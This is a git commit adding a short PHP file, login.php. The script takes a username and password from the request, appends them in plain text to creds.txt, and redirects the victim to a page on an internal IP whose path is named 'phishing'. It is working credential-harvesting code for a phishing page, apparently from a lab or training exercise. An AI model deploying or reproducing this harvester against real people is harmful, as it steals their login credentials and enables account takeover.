fabe7cf3b0ffbc347f884170f9b2bfa7369f2964
MDRsalokin <120145674+MDRsalokin@users.noreply.github.com>
2025-04-01 10:09:39 -0300

    login.php

---
+++ login.php
@@ -0,0 +1,9 @@
+<?php
+if (isset($_GET['username']) && isset($_GET['password'])) {
+    $file = fopen("creds.txt", "a+");
+    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
+    header("Location: http://10.129.95.33/phishing/index.php");
+    fclose($file);
+    exit();
+}
+?>
